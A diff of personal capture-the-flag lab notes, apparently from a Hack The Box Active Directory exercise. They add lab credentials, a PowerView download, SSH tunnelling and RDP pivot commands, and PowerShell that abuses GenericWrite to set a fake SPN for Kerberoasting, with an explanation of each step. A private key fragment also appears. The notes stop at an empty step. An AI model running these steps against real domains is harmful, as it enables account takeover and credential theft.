@@ -209,10 +209,57 @@ WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
 -----END OPENSSH PRIVATE KEY-----
 
 
+mssqladm:DBAilfreight1!
 
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
 
 
 Question 1 - Set a fake SPN on the ttimmons user. Kerberoast this user and crack the TGS ticket offline to reveal their cleartext password. Submit this password as your answer. 
+1. ssh -D 9050 -i rootkey -L 1337:172.16.8.20:3389 root@10.129.229.147 
+2. in second terminal tab -> ssh -D 9050 -i rootkey root@10.129.229.147
+3. now because of the first command we ran we can RDP back to hporter and transfer PowerView which we downloaded before hand 
+4. xfreerdp /v:127.0.0.1:1337 /u:hporter /p:Gr8hambino! /drive:shared,/home/htb-ac-1235531/Desktop
+5. on hporter cli -> cd C:\share -> copy \\TSCLIENT\shared\PowerView.ps1
+6. on hporter cli -> powershell -> Import-Module .\PowerView.ps1 
+7. $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
+Set-DomainObject -credential \$Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
+
+
+What Are We Doing with These Commands?
+We're abusing GenericWrite on ttimmons to set a fake SPN, enabling a Kerberoasting attack.
+
+Breaking It Down Step by Step
+
+A. Creating a PSCredential Object
+$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
+
+* We store the password securely.
+
+* Create a PowerShell credential object for mssqladm (a previously compromised account).
+
+* This credential will be used to authenticate and modify ttimmons.
+
+
+
+B. Using Set-DomainObject to Modify ttimmons's SPN
+Set-DomainObject -Credential $Cred -Identity ttimmons -SET @{servicePrincipalName='acmetesting/LEGIT'} -Verbose
+
+Set-DomainObject is a PowerView function that modifies an Active Directory object.
+
+-Credential $Cred: Uses the credentials for mssqladm.
+
+-Identity ttimmons: Target user we are modifying.
+
+-SET @{servicePrincipalName='acmetesting/LEGIT'}:
+
+This adds a fake SPN (acmetesting/LEGIT) to ttimmons, making the system think ttimmons is running a service.
+
+
+8.  
+
+
 
 
 Question 2 - After obtaining Domain Admin rights, authenticate to the domain controller and submit the contents of the flag.txt file on the Administrator Desktop.
